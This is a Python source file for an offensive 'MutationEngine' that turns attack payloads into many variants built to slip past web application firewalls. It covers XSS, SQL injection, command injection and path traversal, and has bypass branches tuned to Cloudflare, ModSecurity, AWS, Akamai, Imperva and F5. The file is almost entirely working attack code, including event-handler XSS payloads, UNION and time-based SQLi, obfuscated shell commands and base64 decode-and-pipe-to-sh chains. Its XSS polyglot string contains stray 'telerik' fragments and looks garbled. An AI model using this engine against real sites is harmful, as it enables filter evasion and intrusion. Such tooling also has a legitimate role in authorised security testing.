"""
MutationEngine — Systematic payload mutation for WAF/filter bypass.

Generates mutated variants of attack payloads using encoding tricks,
case variations, keyword splitting, whitespace injection, and
WAF-specific bypass techniques.

Usage:
    engine = MutationEngine()
    variants = engine.mutate("<script>alert(1)</script>", context="xss", max_variants=15)
    variants = engine.mutate("' OR 1=1--", context="sqli", waf_name="cloudflare", max_variants=20)
    all_variants = engine.mutate_batch(payloads, context="xss", max_per_payload=5)
"""

import logging
import random
import re
import urllib.parse
import html
import base64
from typing import List, Optional

logger = logging.getLogger(__name__)


class MutationEngine:
    """Generates mutated payload variants to bypass WAFs, filters, and input validation."""

    # Characters commonly filtered and their encoded alternatives
    ENCODING_MAP = {
        "<": ["%3C", "%3c", "%253C", "&#60;", "&#x3c;", "&#x3C;", "\\u003c", "%C0%BC"],
        ">": ["%3E", "%3e", "%253E", "&#62;", "&#x3e;", "&#x3E;", "\\u003e", "%C0%BE"],
        "'": ["%27", "%2527", "&#39;", "&#x27;", "\\u0027", "%C0%A7"],
        '"': ["%22", "%2522", "&#34;", "&#x22;", "\\u0022", "%C0%A2"],
        "(": ["%28", "%2528", "&#40;", "&#x28;", "\\u0028"],
        ")": ["%29", "%2529", "&#41;", "&#x29;", "\\u0029"],
        "/": ["%2F", "%2f", "%252F", "&#47;", "&#x2f;", "\\u002f"],
        " ": ["%20", "%2520", "+", "\\t", "\\n", "%09", "%0a", "/**/"],
        "=": ["%3D", "%3d", "%253D", "&#61;", "&#x3d;"],
    }

    # XSS event handler alternatives
    XSS_EVENTS = [
        "onerror", "onload", "onfocus", "onmouseover", "onmouseenter",
        "onclick", "onanimationstart", "onanimationend", "ontoggle",
        "onpointerover", "onpointerenter", "onauxclick", "onbeforeinput",
        "onblur", "onchange", "oncontextmenu", "ondblclick", "ondrag",
        "onfocusin", "oninput", "onkeydown", "onkeypress", "onkeyup",
        "onmousedown", "onmouseout", "onmouseup", "onpaste", "onreset",
        "onresize", "onscroll", "onselect", "onsubmit", "ontouchstart",
        "onwheel", "onpageshow",
    ]

    # XSS tag alternatives
    XSS_TAGS = [
        "img", "svg", "details", "marquee", "iframe", "video", "audio",
        "body", "input", "select", "textarea", "button", "math", "object",
        "embed", "a", "div", "table", "form", "isindex", "xmp",
    ]

    # SQL comment terminators
    SQL_COMMENTS = ["--", "#", "-- -", "--+", "/**/", ";--", ";#"]

    # Path traversal variants
    PATH_TRAVERSALS = [
        "../", "..\\", "..%2f", "..%2F", "..%5c", "..%5C",
        "%2e%2e/", "%2e%2e%2f", "..%252f", "..%255c",
        "....//", "....\\\\", "..;/", "%c0%ae%c0%ae/",
        "..%c0%af", "..%ef%bc%8f",
    ]

    def _case_mutations(self, payload: str) -> List[str]:
        """Generate case-varied mutations."""
        results = []

        # Alternating case: start upper
        alt1 = "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )
        if alt1 != payload:
            results.append(alt1)

        # Alternating case: start lower
        alt2 = "".join(
            c.lower() if i % 2 == 0 else c.upper()
            for i, c in enumerate(payload)
        )
        if alt2 != payload and alt2 != alt1:
            results.append(alt2)

        # Uppercase keywords within the payload
        keywords = [
            "script", "select", "union", "insert", "update", "delete",
            "drop", "exec", "alert", "confirm", "prompt", "fetch",
            "eval", "function", "document", "window", "cookie",
            "onload", "onerror", "onclick", "iframe", "object", "embed",
            "from", "where", "order", "group", "having", "limit",
            "concat", "substring", "char", "ascii", "sleep", "benchmark",
            "waitfor", "delay", "into", "outfile", "load_file",
        ]
        upper_kw = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            upper_kw = pattern.sub(kw.upper(), upper_kw)
        if upper_kw != payload:
            results.append(upper_kw)

        # Random case (generate 2 variants)
        for _ in range(2):
            rand_case = "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in payload
            )
            if rand_case != payload:
                results.append(rand_case)

        return results

    def _encoding_mutations(self, payload: str) -> List[str]:
        """Generate encoding-based mutations."""
        results = []

        # Single URL encoding
        url_encoded = urllib.parse.quote(payload, safe="")
        if url_encoded != payload:
            results.append(url_encoded)

        # Double URL encoding
        double_encoded = urllib.parse.quote(url_encoded, safe="")
        if double_encoded != url_encoded:
            results.append(double_encoded)

        # HTML entity encoding (decimal)
        html_dec = "".join(f"&#{ord(c)};" if not c.isalnum() else c for c in payload)
        if html_dec != payload:
            results.append(html_dec)

        # HTML entity encoding (hex)
        html_hex = "".join(f"&#x{ord(c):x};" if not c.isalnum() else c for c in payload)
        if html_hex != payload:
            results.append(html_hex)

        # Full HTML entity encoding (every char)
        full_html_dec = "".join(f"&#{ord(c)};" for c in payload)
        results.append(full_html_dec)

        # Unicode escape encoding
        unicode_esc = "".join(f"\\u{ord(c):04x}" if not c.isalnum() else c for c in payload)
        if unicode_esc != payload:
            results.append(unicode_esc)

        # Base64 (useful for specific injection contexts)
        b64 = base64.b64encode(payload.encode()).decode()
        results.append(b64)

        # Overlong UTF-8 for key chars
        overlong_map = {"<": "%C0%BC", ">": "%C0%BE", "'": "%C0%A7", '"': "%C0%A2", "/": "%C0%AF"}
        overlong = payload
        for char, replacement in overlong_map.items():
            overlong = overlong.replace(char, replacement)
        if overlong != payload:
            results.append(overlong)

        # Mixed encoding: URL-encode only special chars
        mixed = ""
        for c in payload:
            if c in "<>'\"/()= ":
                mixed += urllib.parse.quote(c, safe="")
            else:
                mixed += c
        if mixed != payload and mixed != url_encoded:
            results.append(mixed)

        # Hex encoding for SQL contexts
        if any(kw in payload.lower() for kw in ["select", "union", "insert", "drop"]):
            hex_payload = "0x" + payload.encode().hex()
            results.append(hex_payload)

        return results

    def _whitespace_mutations(self, payload: str) -> List[str]:
        """Generate whitespace and comment injection mutations."""
        results = []

        # Tab instead of space
        tab_variant = payload.replace(" ", "\t")
        if tab_variant != payload:
            results.append(tab_variant)

        # Newline instead of space
        nl_variant = payload.replace(" ", "\n")
        if nl_variant != payload:
            results.append(nl_variant)

        # Carriage return + newline
        crlf_variant = payload.replace(" ", "\r\n")
        if crlf_variant != payload:
            results.append(crlf_variant)

        # %09 (tab) URL-encoded
        tab_url = payload.replace(" ", "%09")
        if tab_url != payload:
            results.append(tab_url)

        # %0a (newline) URL-encoded
        nl_url = payload.replace(" ", "%0a")
        if nl_url != payload:
            results.append(nl_url)

        # %0d%0a (CRLF) URL-encoded
        crlf_url = payload.replace(" ", "%0d%0a")
        if crlf_url != payload:
            results.append(crlf_url)

        # SQL comment-as-space
        sql_comment = payload.replace(" ", "/**/")
        if sql_comment != payload:
            results.append(sql_comment)

        # Nested SQL comments
        nested_comment = payload.replace(" ", "/*!*/")
        if nested_comment != payload:
            results.append(nested_comment)

        # MySQL version comment
        mysql_comment = payload.replace(" ", "/*!50000*/")
        if mysql_comment != payload:
            results.append(mysql_comment)

        # NULL byte injection in the middle of keywords
        null_variants = []
        keywords_in_payload = re.findall(r'[a-zA-Z]{4,}', payload)
        for kw in keywords_in_payload[:3]:
            mid = len(kw) // 2
            null_kw = kw[:mid] + "%00" + kw[mid:]
            null_variant = payload.replace(kw, null_kw, 1)
            if null_variant != payload:
                null_variants.append(null_variant)
        results.extend(null_variants[:2])

        # HTML comment injection within tags
        if "<" in payload:
            html_comment = re.sub(
                r'<(\w{3,})',
                lambda m: f"<{m.group(1)[:len(m.group(1))//2]}<!---->{m.group(1)[len(m.group(1))//2:]}",
                payload
            )
            if html_comment != payload:
                results.append(html_comment)

        # IFS bypass for command injection contexts
        ifs_variant = payload.replace(" ", "${IFS}")
        if ifs_variant != payload:
            results.append(ifs_variant)

        # $IFS$9 variant
        ifs9_variant = payload.replace(" ", "$IFS$9")
        if ifs9_variant != payload:
            results.append(ifs9_variant)

        # Brace expansion bypass
        brace_variant = payload.replace(" ", "{,}")
        if brace_variant != payload:
            results.append(brace_variant)

        return results

    def _splitting_mutations(self, payload: str) -> List[str]:
        """Generate keyword-splitting mutations."""
        results = []

        # JavaScript string concatenation
        keywords = re.findall(r'[a-zA-Z]{4,}', payload)
        for kw in keywords[:3]:
            mid = len(kw) // 2
            js_concat = f"'{kw[:mid]}'+" + f"'{kw[mid:]}'"
            split_variant = payload.replace(kw, js_concat, 1)
            if split_variant != payload:
                results.append(split_variant)

        # CHAR() for SQL keywords
        sql_keywords = ["select", "union", "insert", "update", "delete", "drop", "exec", "from", "where"]
        for kw in sql_keywords:
            if kw in payload.lower():
                char_codes = ",".join(str(ord(c)) for c in kw.upper())
                char_expr = f"CHAR({char_codes})"
                # Case-insensitive replacement
                split_variant = re.sub(re.escape(kw), char_expr, payload, count=1, flags=re.IGNORECASE)
                if split_variant != payload:
                    results.append(split_variant)
                break  # One SQL split is enough

        # String.fromCharCode for JS
        js_keywords = ["alert", "confirm", "prompt", "eval", "document", "cookie", "fetch"]
        for kw in js_keywords:
            if kw in payload.lower():
                char_codes = ",".join(str(ord(c)) for c in kw)
                from_char = f"String.fromCharCode({char_codes})"
                split_variant = payload.replace(kw, from_char, 1)
                if split_variant != payload:
                    results.append(split_variant)
                break

        # PHP chr() chains
        for kw in keywords[:2]:
            chr_chain = ".".join(f"chr({ord(c)})" for c in kw)
            split_variant = payload.replace(kw, chr_chain, 1)
            if split_variant != payload:
                results.append(split_variant)

        # Python chr() chains
        for kw in keywords[:1]:
            py_chr = "+".join(f"chr({ord(c)})" for c in kw)
            split_variant = payload.replace(kw, py_chr, 1)
            if split_variant != payload:
                results.append(split_variant)

        # Reverse + reverse function trick
        for kw in keywords[:2]:
            reversed_kw = kw[::-1]
            if len(kw) >= 4:
                results.append(payload.replace(kw, reversed_kw, 1))

        return results

    def _xss_context_mutations(self, payload: str) -> List[str]:
        """Generate XSS-specific context mutations."""
        results = []

        # Event handler alternatives
        event_match = re.search(r'on\w+\s*=', payload, re.IGNORECASE)
        if event_match:
            original_event = event_match.group(0).split("=")[0].strip()
            for event in random.sample(self.XSS_EVENTS, min(6, len(self.XSS_EVENTS))):
                if event.lower() != original_event.lower():
                    variant = payload.replace(original_event, event, 1)
                    if variant != payload:
                        results.append(variant)

        # Tag alternatives for <script>
        if "<script" in payload.lower():
            for tag in random.sample(self.XSS_TAGS, min(8, len(self.XSS_TAGS))):
                if tag == "img":
                    results.append(f'<img src=x onerror=alert(1)>')
                    results.append(f'<img/src=x onerror=alert(1)>')
                elif tag == "svg":
                    results.append(f'<svg onload=alert(1)>')
                    results.append(f'<svg/onload=alert(1)>')
                elif tag == "details":
                    results.append(f'<details open ontoggle=alert(1)>')
                elif tag == "body":
                    results.append(f'<body onload=alert(1)>')
                elif tag == "input":
                    results.append(f'<input onfocus=alert(1) autofocus>')
                elif tag == "marquee":
                    results.append(f'<marquee onstart=alert(1)>')
                elif tag == "iframe":
                    results.append(f'<iframe src="javascript:alert(1)">')
                    results.append(f'<iframe onload=alert(1)>')
                elif tag == "video":
                    results.append(f'<video><source onerror=alert(1)>')
                elif tag == "math":
                    results.append(f'<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">')
                elif tag == "object":
                    results.append(f'<object data="javascript:alert(1)">')
                elif tag == "a":
                    results.append(f'<a href="javascript:alert(1)">click</a>')
                elif tag == "embed":
                    results.append(f'<embed src="javascript:alert(1)">')
                elif tag == "select":
                    results.append(f'<select onfocus=alert(1) autofocus>')
                elif tag == "textarea":
                    results.append(f'<textarea onfocus=alert(1) autofocus>')

        # JavaScript protocol alternatives
        if "javascript:" in payload.lower():
            results.append(payload.replace("javascript:", "javascript\t:", 1))
            results.append(payload.replace("javascript:", "java\nscript:", 1))
            results.append(payload.replace("javascript:", "&#106;avascript:", 1))
            results.append(payload.replace("javascript:", "&#x6A;avascript:", 1))
            results.append(payload.replace("javascript:", "jav\tascript:", 1))
            results.append(payload.replace("javascript:", "jav&#x09;ascript:", 1))
            results.append(payload.replace("javascript:", "jav&#x0A;ascript:", 1))

        # Template literal trick
        if "alert(" in payload:
            results.append(payload.replace("alert(1)", "alert`1`"))
            results.append(payload.replace("alert(1)", "[].constructor.constructor('return alert(1)')()"))
            results.append(payload.replace("alert(1)", "window['al'+'ert'](1)"))
            results.append(payload.replace("alert(1)", "self['al'+'ert'](1)"))
            results.append(payload.replace("alert(1)", "top['al'+'ert'](1)"))

        # SVG-specific payloads
        results.append('<svg><animate onbegin=alert(1) attributeName=x dur=1s>')
        results.append('<svg><set onbegin=alert(1) attributeName=x to=1>')

        # Polyglot XSS
        results.append("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik11/%0telerik0d//*</stYle/</titLe/</telerik/</telerik/</telerik/</ifrAme/</noscRipt/</txetAera/</svG/</662/'-alert(1)-'>")

        return results

    def _sqli_context_mutations(self, payload: str) -> List[str]:
        """Generate SQL injection-specific context mutations."""
        results = []

        # Comment style alternatives
        for comment in self.SQL_COMMENTS:
            if "--" in payload and comment != "--":
                results.append(re.sub(r'--.*$', comment, payload))
            elif "#" in payload and comment != "#":
                results.append(re.sub(r'#.*$', comment, payload))

        # UNION SELECT variations
        if "union" in payload.lower() and "select" in payload.lower():
            results.append(re.sub(r'union\s+select', 'UNION ALL SELECT', payload, flags=re.IGNORECASE))
            results.append(re.sub(r'union\s+select', 'UNION/**/SELECT', payload, flags=re.IGNORECASE))
            results.append(re.sub(r'union\s+select', 'UNION%0aSELECT', payload, flags=re.IGNORECASE))
            results.append(re.sub(r'union\s+select', 'UNION%09SELECT', payload, flags=re.IGNORECASE))
            results.append(re.sub(r'union\s+select', '/*!UNION*//*!SELECT*/', payload, flags=re.IGNORECASE))
            results.append(re.sub(r'union\s+select', 'uNiOn SeLeCt', payload, flags=re.IGNORECASE))
            results.append(re.sub(r'union\s+select', 'UnIoN/*!50000SeLeCt*/', payload, flags=re.IGNORECASE))

        # OR/AND alternatives
        if " or " in payload.lower():
            results.append(re.sub(r'\bor\b', '||', payload, flags=re.IGNORECASE))
            results.append(re.sub(r'\bor\b', 'OR', payload, flags=re.IGNORECASE))
        if " and " in payload.lower():
            results.append(re.sub(r'\band\b', '&&', payload, flags=re.IGNORECASE))
            results.append(re.sub(r'\band\b', 'AND', payload, flags=re.IGNORECASE))

        # Numeric comparisons
        if "1=1" in payload:
            results.append(payload.replace("1=1", "2=2"))
            results.append(payload.replace("1=1", "1<2"))
            results.append(payload.replace("1=1", "'a'='a'"))
            results.append(payload.replace("1=1", "1 LIKE 1"))
            results.append(payload.replace("1=1", "1 IN (1)"))
            results.append(payload.replace("1=1", "1 BETWEEN 0 AND 2"))
            results.append(payload.replace("1=1", "NOT 1=0"))

        # String concatenation alternatives
        if "concat(" in payload.lower():
            results.append(re.sub(r'concat\(([^)]+)\)', r'\1', payload, flags=re.IGNORECASE))

        # Time-based blind variations
        if "sleep(" in payload.lower():
            results.append(re.sub(r'sleep\(\d+\)', 'BENCHMARK(10000000,SHA1(1))', payload, flags=re.IGNORECASE))
            results.append(re.sub(r'sleep\(\d+\)', "pg_sleep(5)", payload, flags=re.IGNORECASE))
            results.append(re.sub(r'sleep\(\d+\)', "WAITFOR DELAY '0:0:5'", payload, flags=re.IGNORECASE))

        # Quote style alternatives
        if "'" in payload:
            results.append(payload.replace("'", '"'))
        if "'" in payload:
            results.append(payload.replace("'", "\\'"))

        # Inline comments inside keywords
        sql_kws = {"select": "SEL/**/ECT", "union": "UNI/**/ON", "from": "FR/**/OM",
                    "where": "WH/**/ERE", "insert": "INS/**/ERT", "update": "UPD/**/ATE"}
        inlined = payload
        for kw, replacement in sql_kws.items():
            inlined = re.sub(re.escape(kw), replacement, inlined, flags=re.IGNORECASE)
        if inlined != payload:
            results.append(inlined)

        return results

    def _cmd_context_mutations(self, payload: str) -> List[str]:
        """Generate command injection-specific context mutations."""
        results = []

        # Command separator alternatives
        separators = [";", "|", "||", "&&", "\n", "%0a", "`", "$()"]
        for sep in [";", "|", "&&"]:
            if sep in payload:
                for alt_sep in separators:
                    if alt_sep != sep:
                        variant = payload.replace(sep, alt_sep, 1)
                        if variant != payload:
                            results.append(variant)

        # Backtick vs $() substitution
        backtick_match = re.search(r'`([^`]+)`', payload)
        if backtick_match:
            cmd = backtick_match.group(1)
            results.append(payload.replace(f"`{cmd}`", f"$({cmd})"))
        dollar_match = re.search(r'\$\(([^)]+)\)', payload)
        if dollar_match:
            cmd = dollar_match.group(1)
            results.append(payload.replace(f"$({cmd})", f"`{cmd}`"))

        # IFS tricks for space bypass
        if " " in payload:
            results.append(payload.replace(" ", "${IFS}"))
            results.append(payload.replace(" ", "$IFS$9"))
            results.append(payload.replace(" ", "{,}"))
            results.append(payload.replace(" ", "%09"))
            results.append(payload.replace(" ", "<"))  # bash input redirect trick

        # Variable expansion tricks
        common_cmds = {
            "cat": ["c'a't", "c\"a\"t", "c\\at", "/bin/cat", "ca$()t", "c${EMPTY}at"],
            "ls": ["l's'", "l\"s\"", "l\\s", "/bin/ls", "l$()s"],
            "id": ["i'd'", "i\"d\"", "i\\d", "/usr/bin/id"],
            "whoami": ["w'h'oami", "w\"h\"oami", "wh\\oami", "/usr/bin/whoami"],
            "wget": ["w'g'et", "wge\"t\"", "w\\get", "/usr/bin/wget"],
            "curl": ["c'u'rl", "cu\"r\"l", "c\\url", "/usr/bin/curl"],
            "ping": ["p'i'ng", "pi\"n\"g", "p\\ing", "/bin/ping"],
            "nc": ["n'c'", "n\"c\"", "n\\c", "/bin/nc"],
            "bash": ["b'a'sh", "b\"a\"sh", "b\\ash", "/bin/bash"],
            "sh": ["s'h'", "s\"h\"", "s\\h", "/bin/sh"],
            "python": ["py'th'on", "pyt\"ho\"n", "pyt\\hon"],
            "perl": ["pe'r'l", "pe\"r\"l", "per\\l"],
        }

        payload_lower = payload.lower()
        for cmd, alternatives in common_cmds.items():
            if cmd in payload_lower:
                for alt in alternatives:
                    variant = re.sub(r'\b' + re.escape(cmd) + r'\b', alt, payload, count=1, flags=re.IGNORECASE)
                    if variant != payload:
                        results.append(variant)
                break  # One command substitution set is enough

        # Wildcard tricks
        if "/etc/passwd" in payload:
            results.append(payload.replace("/etc/passwd", "/e?c/p?sswd"))
            results.append(payload.replace("/etc/passwd", "/e*c/pas*wd"))
            results.append(payload.replace("/etc/passwd", "/etc/pas${EMPTY}swd"))

        # Hex-encoded command
        if len(payload) < 100:
            hex_cmd = "".join(f"\\x{ord(c):02x}" for c in payload)
            results.append(f'echo -e "{hex_cmd}" | sh')
            results.append(f"printf '{hex_cmd}' | sh")

        # Base64 encoded execution
        b64 = base64.b64encode(payload.encode()).decode()
        results.append(f"echo {b64} | base64 -d | sh")
        results.append(f"bash -c '{{echo,{b64}}}|{{base64,-d}}|bash'")

        return results

    def _path_traversal_mutations(self, payload: str) -> List[str]:
        """Generate path traversal-specific mutations."""
        results = []

        for traversal in self.PATH_TRAVERSALS:
            variant = payload.replace("../", traversal)
            if variant != payload:
                results.append(variant)

        # Null byte injection (for older systems)
        if "." in payload:
            results.append(payload + "%00")
            results.append(payload + "%00.html")
            results.append(payload + "%00.jpg")
            results.append(payload + "\x00")

        # Double encoding the dots
        if ".." in payload:
            results.append(payload.replace("..", "%2e%2e"))
            results.append(payload.replace("..", "%252e%252e"))
            results.append(payload.replace("..", "..%c0%af"))

        # Absolute path variants
        if "/etc/passwd" in payload:
            results.append("/etc/passwd")
            results.append("//etc/passwd")
            results.append("/./etc/passwd")
            results.append("file:///etc/passwd")
            results.append("/etc/passwd%00")

        return results

    def _waf_specific(self, payload: str, waf_name: str) -> List[str]:
        """Generate WAF-specific bypass mutations."""
        results = []
        waf = waf_name.lower() if waf_name else ""

        if "cloudflare" in waf:
            # Cloudflare bypasses
            results.append(urllib.parse.quote(payload, safe=""))  # URL encode everything
            # Unicode normalization tricks
            results.append(payload.replace("<", "\uff1c").replace(">", "\uff1e"))
            # Chunked keyword
            for kw in re.findall(r'[a-zA-Z]{4,}', payload)[:2]:
                mid = len(kw) // 2
                results.append(payload.replace(kw, f"{kw[:mid]}/*cf*/{kw[mid:]}", 1))
            # Double encoding
            results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
            # Cloudflare sometimes misses payloads with null bytes in between
            for kw in re.findall(r'[a-zA-Z]{5,}', payload)[:2]:
                results.append(payload.replace(kw, kw[:3] + "\x00" + kw[3:], 1))

        elif "modsecurity" in waf or "modsec" in waf:
            # ModSecurity bypasses
            # Parameter pollution
            if "=" in payload:
                parts = payload.split("=", 1)
                results.append(f"{parts[0]}=&{parts[0]}={parts[1]}")
            # Multipart boundary tricks
            results.append(payload.replace(" ", "/**/"))
            results.append(payload.replace(" ", "/*!*/"))
            # MySQL version-specific comments
            results.append(re.sub(
                r'(union|select|from|where)',
                lambda m: f"/*!50000{m.group(1)}*/",
                payload,
                flags=re.IGNORECASE
            ))
            # Case randomization
            results.append("".join(
                c.upper() if random.random() > 0.5 else c.lower() for c in payload
            ))
            # HPP: repeat parameter with different encoding
            if "'" in payload:
                results.append(payload.replace("'", "%bf%27"))  # GBK encoding trick

        elif "aws" in waf:
            # AWS WAF bypasses
            results.append(payload.replace(" ", "%0a"))
            results.append(payload.replace(" ", "%0d"))
            # Case manipulation
            results.extend(self._case_mutations(payload)[:3])
            # Encoding chains
            results.append(urllib.parse.quote(payload, safe=""))
            results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
            # Comment-based
            results.append(payload.replace(" ", "/*aws*/"))

        elif "akamai" in waf:
            # Akamai bypasses
            # Akamai often doesn't decode double encoding
            results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
            # Tab and newline tricks
            results.append(payload.replace(" ", "\t"))
            results.append(payload.replace(" ", "%09"))
            # Unicode fullwidth characters
            fullwidth = payload.translate(str.maketrans(
                'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
                '\uff41\uff42\uff43\uff44\uff45\uff46\uff47\uff48\uff49\uff4a\uff4b\uff4c\uff4d\uff4e\uff4f\uff50\uff51\uff52\uff53\uff54\uff55\uff56\uff57\uff58\uff59\uff5a\uff21\uff22\uff23\uff24\uff25\uff26\uff27\uff28\uff29\uff2a\uff2b\uff2c\uff2d\uff2e\uff2f\uff30\uff31\uff32\uff33\uff34\uff35\uff36\uff37\uff38\uff39\uff3a'
            ))
            results.append(fullwidth)
            # Inline comments
            results.append(payload.replace(" ", "/*akamai*/"))

        elif "imperva" in waf or "incapsula" in waf:
            # Imperva/Incapsula bypasses
            results.append(payload.replace(" ", "%0b"))  # Vertical tab
            results.append(payload.replace(" ", "%0c"))  # Form feed
            results.append(urllib.parse.quote(payload, safe=""))
            # Comment inside keywords
            for kw in re.findall(r'[a-zA-Z]{4,}', payload)[:3]:
                mid = len(kw) // 2
                results.append(payload.replace(kw, f"{kw[:mid]}/*imperva*/{kw[mid:]}", 1))

        elif "f5" in waf or "big-ip" in waf or "bigip" in waf:
            # F5 BIG-IP bypasses
            results.append(payload.replace(" ", "%00"))
            results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
            results.append(payload.replace(" ", "/*!f5*/"))

        else:
            # Generic WAF bypasses
            results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
            results.append(payload.replace(" ", "%00"))
            results.append(payload.replace(" ", "%09"))
            # Content-type confusion
            results.append(payload)
            # Null byte insertion
            for kw in re.findall(r'[a-zA-Z]{4,}', payload)[:2]:
                mid = len(kw) // 2
                results.append(payload.replace(kw, f"{kw[:mid]}%00{kw[mid:]}", 1))
            # Mixed encoding
            mixed = ""
            for i, c in enumerate(payload):
                if i % 3 == 0 and c in "<>'\"/()=":
                    mixed += urllib.parse.quote(c, safe="")
                else:
                    mixed += c
            if mixed != payload:
                results.append(mixed)

        return results

    def mutate(
        self,
        payload: str,
        context: str = "generic",
        waf_name: Optional[str] = None,
        max_variants: int = 10,
    ) -> List[str]:
        """
        Generate mutated variants of a payload.

        Args:
            payload: Original attack payload
            context: Attack context — "xss", "sqli", "cmd", "path", "generic"
            waf_name: Target WAF name for specific bypasses (e.g., "cloudflare", "modsecurity")
            max_variants: Maximum number of variants to return

        Returns:
            List of payload variants (original payload is always first)
        """
        if not payload or not payload.strip():
            return [payload] if payload else []

        all_variants = set()

        try:
            # Always apply generic mutations
            all_variants.update(self._case_mutations(payload))
            all_variants.update(self._encoding_mutations(payload))
            all_variants.update(self._whitespace_mutations(payload))
            all_variants.update(self._splitting_mutations(payload))

            # Context-specific mutations
            ctx = context.lower().strip()
            if ctx in ("xss", "cross-site scripting"):
                all_variants.update(self._xss_context_mutations(payload))
            elif ctx in ("sqli", "sql", "sql injection"):
                all_variants.update(self._sqli_context_mutations(payload))
            elif ctx in ("cmd", "command", "rce", "command injection", "os command"):
                all_variants.update(self._cmd_context_mutations(payload))
            elif ctx in ("path", "lfi", "path traversal", "directory traversal"):
                all_variants.update(self._path_traversal_mutations(payload))
            elif ctx == "generic":
                # For generic, apply all context mutations — let the caller filter
                all_variants.update(self._xss_context_mutations(payload))
                all_variants.update(self._sqli_context_mutations(payload))
                all_variants.update(self._cmd_context_mutations(payload))
                all_variants.update(self._path_traversal_mutations(payload))

            # WAF-specific bypasses (prioritized)
            waf_variants = []
            if waf_name:
                waf_variants = self._waf_specific(payload, waf_name)
                all_variants.update(waf_variants)

            # Remove the original from variants set (we'll prepend it)
            all_variants.discard(payload)
            # Remove empty strings and None
            all_variants.discard("")
            all_variants.discard(None)

            # Build final list: original first, then WAF-specific, then rest
            final = [payload]

            # Prioritize WAF-specific bypasses
            if waf_variants:
                waf_set = set(waf_variants) - {payload}
                prioritized = [v for v in waf_variants if v in waf_set]
                # Deduplicate while preserving order
                seen = {payload}
                for v in prioritized:
                    if v and v not in seen:
                        final.append(v)
                        seen.add(v)
                remaining = [v for v in all_variants if v not in seen]
            else:
                remaining = list(all_variants)

            # Fill remaining slots
            slots_left = max_variants - len(final)
            if slots_left > 0:
                if len(remaining) > slots_left:
                    remaining = random.sample(remaining, slots_left)
                final.extend(remaining)

            logger.debug(
                "MutationEngine: payload=%s context=%s waf=%s → %d variants",
                payload[:50], context, waf_name, len(final),
            )
            return final[:max_variants]

        except Exception as e:
            logger.error("MutationEngine.mutate() error: %s", e)
            return [payload]

    def mutate_batch(
        self,
        payloads: List[str],
        context: str = "generic",
        waf_name: Optional[str] = None,
        max_per_payload: int = 5,
    ) -> List[str]:
        """
        Mutate multiple payloads and return a flat deduplicated list.

        Args:
            payloads: List of original payloads
            context: Attack context
            waf_name: Target WAF name
            max_per_payload: Max variants per individual payload

        Returns:
            Flat deduplicated list of all variants (originals included)
        """
        if not payloads:
            return []

        seen = set()
        results = []

        for payload in payloads:
            if not payload or not payload.strip():
                continue
            variants = self.mutate(
                payload,
                context=context,
                waf_name=waf_name,
                max_variants=max_per_payload,
            )
            for v in variants:
                if v and v not in seen:
                    seen.add(v)
                    results.append(v)

        logger.debug(
            "MutationEngine.mutate_batch: %d payloads → %d total variants",
            len(payloads), len(results),
        )
        return results
